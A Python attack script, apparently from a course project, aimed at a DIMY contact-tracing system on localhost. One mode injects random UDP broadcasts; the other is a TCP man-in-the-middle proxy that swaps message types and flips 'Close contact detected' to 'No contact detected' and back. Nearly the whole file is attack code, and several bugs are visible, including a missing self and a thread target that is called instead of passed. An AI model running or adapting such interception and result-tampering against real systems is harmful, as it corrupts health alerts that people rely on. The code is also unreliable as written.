## Perform Replay Attack in UDP Broadcast with all nodes
## Perform Man-In-the-Middle Attack in TCP Connection with server
import socket
import threading
import argparse
import pickle
import random
import string
import time

MITM_IP = '127.0.0.1'
MITM_PORT = 55555

class Attacker:

    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.udp_port = 55001
        self.tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tcp_socket.connect((self.server_ip, self.server_port))
        self.udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        
    def generate_random_string(self):
        # Choose from lowercase letters and digits
        characters = string.ascii_lowercase + string.digits
        # Generate a random string of the specified length
        random_string = ''.join(random.choice(characters) for _ in range(134))
        return random_string   
                
    def perform_replay_attack(self):
        sock = self.udp_socket
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.bind(('', self.udp_port))
        while True:
            data, _ = sock.recvfrom(1024)
            message = data.decode()
            print(f"received message: {message}")
            modified_message = self.generate_random_string()
            time.sleep(5)
            sock.sendto(modified_message.encode(), ('<broadcast>', self.udp_port))
            print(f"broadcast message: {modified_message}")
    
    def run_replay_attack(self):
        self.perform_replay_attack()
    
    def handle_client(client_socket, server_socket):
        while True:
            # Receive data from the client (node)
            message = client_socket.recv(1024).decode()
            deserialized_message = pickle.loads(message)
            global modified_data
            if len(deserialized_message):
                if deserialized_message.type == "cbf":
                    print(f"Received CBF from client: {deserialized_message.data}")
                    modified_data = {"type": 'qbf', "data": deserialized_message.data}
                if deserialized_message.type == "qbf":
                    print(f"Received QBF from client: {deserialized_message.data}")
                    modified_data = {"type": 'cbf', "data": deserialized_message.data}
                if deserialized_message.type == "":
                    continue
                if not deserialized_message:
                    break
                serialized_message = pickle.dumps(modified_data)
                # Send the modified data to the server
                server_socket.send(serialized_message)
                print(f"Sent to server: {modified_data}")

            # Receive data from the server
            server_data = server_socket.recv(1024)
            if len(server_data):
                print(f"Received from server: {server_data}")
                if server_data == b'Close contact detected':
                    modified_data = server_data.replace(b'Close contact detected', b'No contact detected')
                elif server_data == b'No contact detected':
                    modified_data = server_data.replace(b'No contact detected', b'Close contact detected')
                # Send the modified data to the client (node)
                client_socket.send(modified_data)
                print(f"Sent to client: {modified_data}")
            time.sleep(5)
            
    def start_mitm(self):
        # Create a socket to listen for incoming connections from nodes
        mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mitm_socket.bind((MITM_IP, MITM_PORT))
        mitm_socket.listen(5)
        print(f"[*] Listening on {MITM_IP} : {MITM_PORT}")

        while True:
            # Accept a connection from a node
            client_socket, addr = mitm_socket.accept()
            print(f"Accepted connection from {addr}")

            # Connect to the DIMY server
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((self.server_ip, self.server_port))

            # Start a thread to handle communication between the node and the server
            client_handler = threading.Thread(target=Attacker.handle_client(), args=(client_socket, server_socket))
            client_handler.start()
    
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Man-in-the-Middle Attack Script")
    parser.add_argument("--attack_type", type=str, choices=['replay', 'MiTM'], required=True, help="Type of attack to perform")
    
    args = parser.parse_args()
    
    if args.attack_type == 'replay':
        attacker = Attacker("127.0.0.1", 55000)
        attacker.run_replay_attack()
    elif args.attack_type == 'MiTM':
        attacker = Attacker("127.0.0.1", 55000)
        attacker.start_mitm()
